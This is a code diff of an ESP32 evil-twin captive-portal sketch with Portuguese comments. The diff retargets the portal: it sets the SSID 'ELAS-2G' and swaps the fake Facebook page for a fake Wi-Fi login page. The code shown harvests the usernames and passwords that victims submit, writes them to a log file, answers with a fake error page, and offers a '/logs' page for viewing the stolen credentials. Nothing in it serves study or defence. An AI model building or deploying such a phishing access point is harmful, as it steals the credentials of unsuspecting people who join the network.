@@ -5,17 +5,18 @@
 #include <DNSServer.h>
 #include <ESPmDNS.h>
 #include <FS.h>
+#include "wifiphishing.h"
 #include "google.h"
 #include "facebook.h"
 #include "erro.h"
 
 #define LOGFILE "/log.txt"
- 
+
 // Ponto de acesso
-const char *ssid="Wi-Fi";
+const char *ssid = "ELAS-2G";
 
 // Login da pagina de captura
-#define captivePortalPage FACEBOOK_HTML
+#define captivePortalPage WIFI_HTML
 #define erroPage ERROPAGE_HTML
 // GOOGLE_HTML, FACEBOOK_HTML
 
@@ -27,17 +28,17 @@ DNSServer dnsServer;
 WebServer server(80);
 
 // Strings de buffer
-String webString="";
-String serialString="";
+String webString = "";
+String serialString = "";
 
 // Pisca o LED integrado numero de vezes
 void blink(int n)
 {
-  for(int i = 0; i < n; i++)
+  for (int i = 0; i < n; i++)
   {
-    digitalWrite(LED_BUILTIN, LOW);    
-    delay(250);                    
-    digitalWrite(LED_BUILTIN, HIGH);  
+    digitalWrite(LED_BUILTIN, LOW);
+    delay(250);
+    digitalWrite(LED_BUILTIN, HIGH);
     delay(250);
   }
 }
@@ -51,17 +52,17 @@ void setup() {
 
   // configuração de LED
   pinMode(LED_BUILTIN, OUTPUT);
-  digitalWrite(LED_BUILTIN, HIGH);  
+  digitalWrite(LED_BUILTIN, HIGH);
 
   // Inicialize o sistema de arquivos (SPIFFS) e leia o arquivo de log, se não estiver presente, crie um novo
   Serial.print("Inicializando o sistema de arquivos (a primeira vez pode levar cerca de 90 segundos)...");
   SPIFFS.begin();
   Serial.println("Sucesso!");
   Serial.print("Verificando o arquivo log.txt...");
-  
+
   // isso abre o arquivo "log.txt" em modo de leitura
   File f = SPIFFS.open(LOGFILE, "r");
-  
+
   if (!f) {
     Serial.print("O arquivo ainda não existe.\n Formatando e criando...");
     SPIFFS.format();
@@ -104,7 +105,7 @@ void setup() {
     String pass = server.arg("pass");
 
     // Enviando dados para Serial (DEBUG
-    serialString = user+":"+pass;
+    serialString = user + ":" + pass;
     Serial.println(serialString);
 
     // Anexar dados ao arquivo de log
@@ -115,21 +116,21 @@ void setup() {
     f.print(":");
     f.println(pass);
     f.close();
-    
+
     // Envie uma resposta de erro ao usuário após a coleta de credencial
     server.send(500, "text/html", erroPage);
 
     // Reinicializar strings de buffer
-    serialString="";
-    webString="";
+    serialString = "";
+    webString = "";
 
     blink(2);
-    
+
   });
 
   // Logging Page
-  server.on("/logs", [](){
-    webString="<html><body><h1>Captured Logs</h1><br><pre>";
+  server.on("/logs", []() {
+    webString = "<html><body><h1>Captured Logs</h1><br><pre>";
     File f = SPIFFS.open(LOGFILE, "r");
     serialString = f.readString();
     webString += serialString;
@@ -137,29 +138,29 @@ void setup() {
     webString += "</pre><br><a href='/logs/clear'>Clear all logs</a></body></html>";
     server.send(200, "text/html", webString);
     Serial.println(serialString);
-    serialString="";
-    webString="";
+    serialString = "";
+    webString = "";
   });
 
   // Limpar todos os logs
-  server.on("/logs/clear", [](){
-    webString="<html><body><h1>All logs cleared</h1><br><a href=\"/esportal\"><- BACK TO INDEX</a></body></html>";
+  server.on("/logs/clear", []() {
+    webString = "<html><body><h1>All logs cleared</h1><br><a href=\"/esportal\"><- BACK TO INDEX</a></body></html>";
     File f = SPIFFS.open(LOGFILE, "w");
     f.println("Credenciais de login capturadas:");
     f.close();
     server.send(200, "text/html", webString);
     Serial.println(serialString);
-    serialString="";
-    webString="";
+    serialString = "";
+    webString = "";
   });
-  
+
   // Inicie o servidor da Web
   Serial.print("Iniciando o Servidor da Web...");
   server.begin();
   Serial.println(" Sucesso!");
-  
+
   blink(1);
-  
+
   Serial.println("Dispositivo pronto!");
 }
 
